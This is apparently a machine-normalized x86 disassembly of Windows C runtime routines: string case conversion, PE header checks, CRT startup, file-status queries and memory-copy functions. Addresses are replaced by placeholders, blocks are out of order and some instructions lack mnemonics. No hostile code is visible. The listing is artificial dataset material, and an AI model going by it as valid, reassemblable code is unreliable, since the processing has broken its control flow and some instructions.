jmp r-xdata
mov al [ ecx ]
cmp al 0x61
jl r-xdata
cmp ecx ebx
jle r-xdata
mov [ edi ] bl
call sub_412089
push 0x22
jmp r-xdata
lea esp [ ebp - 0x14 ]
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_413965
leave
retn
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
mov [ ebp - 0x8 ] ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x1
jb r-xdata
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_41202a
add esp 0x14
jmp r-xdata
sub al 0x20
mov [ ecx ] al
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push 0x1
push [ eax + 0x4 ]
push ecx
push [ ebp - 0x8 ]
push 0xffffffff
push edi
push esi
push [ eax + 0x14 ]
push edx
call sub_418df5
add esp 0x24
test eax eax
je r-xdata
call sub_412089
mov [ eax ] 0xc
jmp r-xdata
lea eax [ ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
call sub_412089
push 0x2a
pop ecx
mov [ eax ] ecx
mov esi ecx
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push edi
call sub_415600
add esp 0xc
mov esi eax
jmp r-xdata
call sub_412089
mov eax [ eax ]
jmp r-xdata
push eax
call sub_40fe88
cmp eax ebx
pop ecx
je r-xdata
call sub_413980
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
call sub_40e632
pop ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
add eax 0x8
sub_410754
push ebp
mov ebp esp
sub esp 0x10
push edi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_4105d8
cmp [ ebp - 0x4 ] 0x0
pop ecx
pop ecx
pop edi
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_410787
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push ebx
push 0xffffffff
push [ esp + 0x10 ]
call sub_410754
mov eax [ esp + 0x14 ]
add esp 0xc
mov eax [ esp + 0x8 ]
cmp eax ebx
jne r-xdata
cmp [ eax ] bl
mov edx eax
je r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
xor eax eax
pop ebx
retn
pop ebx
retn
mov cl [ edx ]
cmp cl 0x61
jl r-xdata
inc edx
cmp [ edx ] bl
jne r-xdata
cmp cl 0x7a
jg r-xdata
pop ebx
retn
sub cl 0x20
mov [ edx ] cl
sub_41080d
cmp [ __dos_header ] 0x5a4d
jne r-xdata
xor eax eax
retn
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
cmp [ eax + r--data ] 0x10b
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
xor ecx ecx
cmp [ eax + __pe32_optional_header ] ecx
setne cl
mov eax ecx
retn
sub_41084e
push 0x1c
push r--data
call sub_412340
mov edi 0x94
push edi
push 0x0
mov ebx [ GetProcessHeap@IAT ]
call ebx
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov [ esi ] edi
push esi
call [ GetVersionExA@IAT ]
push esi
push 0x0
test eax eax
jne r-xdata
push 0x12
call sub_4107e9
mov eax [ esi + 0x10 ]
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov edi [ esi + 0xc ]
and edi 0x7fff
call ebx
push eax
call [ HeapFree@IAT ]
mov esi [ ebp - 0x20 ]
cmp esi 0x2
je r-xdata
call ebx
push eax
call [ HeapFree@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov eax ecx
shl eax 0x8
mov edx [ ebp - 0x28 ]
add eax edx
mov [ rw-data ] esi
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] edi
call sub_41080d
mov [ ebp - 0x20 ] eax
push 0x1
call sub_41710e
pop ecx
test eax eax
jne r-xdata
or edi 0x8000
mov eax 0xff
jmp r-xdata
call sub_411a20
test eax eax
jne r-xdata
push 0x1c
call sub_4107e9
call sub_412385
retn
call sub_4121f7
and [ ebp - 0x4 ] 0x0
call sub_413517
test eax eax
jge r-xdata
push 0x10
call sub_4107e9
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_41917e
mov [ rw-data ] eax
call sub_4190c5
test eax eax
jge r-xdata
push 0x1b
call sub_40e060
pop ecx
call sub_418e52
test eax eax
jge r-xdata
push 0x8
call sub_40e060
pop ecx
push 0x1
call sub_40e17c
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_40e060
pop ecx
mov eax [ rw-data ]
mov [ rw-data ] eax
push eax
push [ rw-data ]
push [ rw-data ]
call sub_402730
add esp 0xc
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push eax
call sub_40e060
pop ecx
call sub_40e2fe
jmp r-xdata
push eax
call sub_40e2dc
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
sub_41091b
pop ecx
call sub_411a20
test eax eax
jne r-xdata
call sub_4121f7
and [ ebp - 0x4 ] 0x0
call sub_413517
test eax eax
jge r-xdata
push 0x10
call sub_4107e9
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_41917e
mov [ rw-data ] eax
call sub_4190c5
test eax eax
jge r-xdata
push 0x1b
call sub_40e060
pop ecx
call sub_418e52
test eax eax
jge r-xdata
push 0x8
call sub_40e060
pop ecx
push 0x1
call sub_40e17c
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_40e060
pop ecx
mov eax [ rw-data ]
mov [ rw-data ] eax
push eax
push [ rw-data ]
push [ rw-data ]
call sub_402730
add esp 0xc
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push eax
call sub_40e060
pop ecx
call sub_40e2fe
jmp r-xdata
push eax
call sub_40e2dc
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_412385
retn
sub_410a0e
push 0x5c
push r--data
call sub_412340
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push 0x30
push edi
push esi
call sub_40fb30
add esp 0xc
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
call sub_41209c
mov [ eax ] edi
call sub_412089
mov [ eax ] 0x16
cmp ecx edi
jl r-xdata
call sub_41209c
mov [ eax ] edi
call sub_412089
mov [ eax ] 0x9
jmp r-xdata
call sub_412385
retn
call sub_41209c
mov [ eax ] edi
call sub_412089
mov [ eax ] 0x9
jmp r-xdata
cmp ecx [ rw-data ]
jb r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
mov eax ecx
sar eax 0x5
lea eax [ eax * 4 + rw-data ]
mov [ ebp + 0xc ] eax
mov ebx ecx
and ebx 0x1f
imul ebx ebx 0x28
mov eax [ eax ]
movzx eax [ eax + ebx + 0x4 ]
and eax 0x1
je r-xdata
push ecx
call sub_414b36
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
add eax ebx
test [ eax + 0x4 ] 0x1
jne r-xdata
push [ eax ]
call [ GetFileType@IAT ]
and eax 0xffff7fff
cmp eax 0x1
je r-xdata
call sub_412089
mov [ eax ] 0x9
mov [ esi + 0x6 ] di
mov [ esi + 0xc ] di
mov [ esi + 0xa ] di
mov [ esi + 0x4 ] di
mov [ esi + 0x8 ] 0x1
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push [ eax + ebx ]
call [ GetFileInformationByHandle@IAT ]
test eax eax
je r-xdata
cmp eax 0x2
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4120af
pop ecx
jmp r-xdata
mov ax [ esi + 0x6 ]
test [ ebp - 0x6c ] 0x1
je r-xdata
xor edx edx
cmp eax 0x2
setne dl
dec edx
mov ecx 0x1000
and edx ecx
add edx ecx
mov [ esi + 0x6 ] dx
mov ecx [ ebp + 0x8 ]
mov [ esi ] ecx
mov [ esi + 0x10 ] ecx
mov [ esi + 0x8 ] 0x1
mov [ esi + 0x4 ] di
mov [ esi + 0xc ] di
mov [ esi + 0xa ] di
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
cmp eax 0x2
jne r-xdata
cmp eax 0x3
je r-xdata
or [ ebp - 0x1c ] 0xffffffff
or ax 0x1b6
or ax 0x124
jmp r-xdata
push edi
lea eax [ ebp + 0xc ]
push eax
push edi
push edi
push edi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push [ eax + ebx ]
call [ PeekNamedPipe@IAT ]
neg eax
sbb eax eax
and eax [ ebp + 0xc ]
mov [ esi + 0x14 ] eax
jmp r-xdata
mov [ esi + 0x14 ] edi
jmp r-xdata
cmp eax edi
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x54 ] edi
jne r-xdata
mov [ esi + 0x6 ] ax
cmp [ ebp - 0x58 ] edi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410d55
mov eax [ ebp - 0x1c ]
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
jmp r-xdata
push 0xffffffff
movzx eax [ ebp - 0x2c ]
push eax
movzx eax [ ebp - 0x2e ]
push eax
movzx eax [ ebp - 0x30 ]
push eax
movzx eax [ ebp - 0x32 ]
push eax
movzx eax [ ebp - 0x36 ]
push eax
movzx eax [ ebp - 0x38 ]
push eax
call sub_414d97
add esp 0x1c
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] edx
cmp [ ebp - 0x60 ] edi
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
mov [ esi + 0x18 ] eax
mov eax [ esi + 0x24 ]
mov [ esi + 0x1c ] eax
jmp r-xdata
push 0xffffffff
movzx eax [ ebp - 0x2c ]
push eax
movzx eax [ ebp - 0x2e ]
push eax
movzx eax [ ebp - 0x30 ]
push eax
movzx eax [ ebp - 0x32 ]
push eax
movzx eax [ ebp - 0x36 ]
push eax
movzx eax [ ebp - 0x38 ]
push eax
call sub_414d97
add esp 0x1c
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
cmp [ ebp - 0x68 ] edi
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x68 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x64 ] edi
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
mov [ esi + 0x28 ] eax
mov eax [ esi + 0x24 ]
mov [ esi + 0x2c ] eax
jmp r-xdata
push 0xffffffff
movzx eax [ ebp - 0x2c ]
push eax
movzx eax [ ebp - 0x2e ]
push eax
movzx eax [ ebp - 0x30 ]
push eax
movzx eax [ ebp - 0x32 ]
push eax
movzx eax [ ebp - 0x36 ]
push eax
movzx eax [ ebp - 0x38 ]
push eax
call sub_414d97
add esp 0x1c
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] edx
mov eax [ ebp - 0x48 ]
mov [ esi + 0x14 ] eax
mov ax [ esi + 0x6 ]
or ax 0x8000
mov [ esi + 0x6 ] ax
mov [ esi ] edi
mov [ esi + 0x10 ] edi
jmp r-xdata
sub_410d5f
mov edx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_410d94
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_410d5f
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_419347
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_419347
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_410e67
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_410d94
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_410d5f
pop esi
pop ebp
retn
sub_410ec0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_410f48 ]
jmp [ ecx * 4 + jump_table_410fc8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_411034 ]
pop esi
pop edi
pop ebp
jmp sub_41950c
jmp [ ecx * 4 + jump_table_4111d0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4110d4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4111d0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_411034 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4111d0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_411034 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_411034 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_411034 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4111d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4111d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4111d0 ]
sub_411230
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_411354
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
cmp ebx 0x4
push edi
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_411412
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax edx
sar eax 0x5
and edx 0x1f
imul edx edx 0x28
push ebx
mov ebx [ ebp + 0xc ]
push esi
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
lea ecx [ eax + edx ]
movzx eax [ ecx + 0x4 ]
and eax 0x80
mov [ ebp + 0x8 ] eax
mov al [ ecx + 0x24 ]
add al al
movsx eax al
push edi
mov edi 0x4000
sar eax 0x1
cmp ebx edi
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ esi ]
lea ecx [ ecx + edx + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax edi
mov eax 0x8000
jmp r-xdata
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ esi ]
lea ecx [ ecx + edx + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ esi ]
lea ecx [ ecx + edx + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_4114ce
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
push 0x16
pop eax
pop esi
retn
sub_411502
push 0x10
push r--data
call sub_412340
mov eax [ ebp + 0xc ]
cmp eax 0x4000
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0x8000
je r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_412089
mov [ eax ] 0x9
jmp r-xdata
cmp eax 0x10000
je r-xdata
call sub_412089
mov [ eax ] 0x9
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x40000
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ edi ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
call sub_412385
retn
cmp eax 0x20000
je r-xdata
push eax
call sub_414b36
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_412089
mov [ eax ] 0x16
xor ebx ebx
call sub_412089
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411412
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4115ef
mov eax [ ebp - 0x1c ]
sub_4115f9
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_410556
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_4195ef
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_411648
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_4115f9
pop ecx
pop ecx
retn
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
retn
sub_411671
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push [ esp + 0x8 ]
call eax
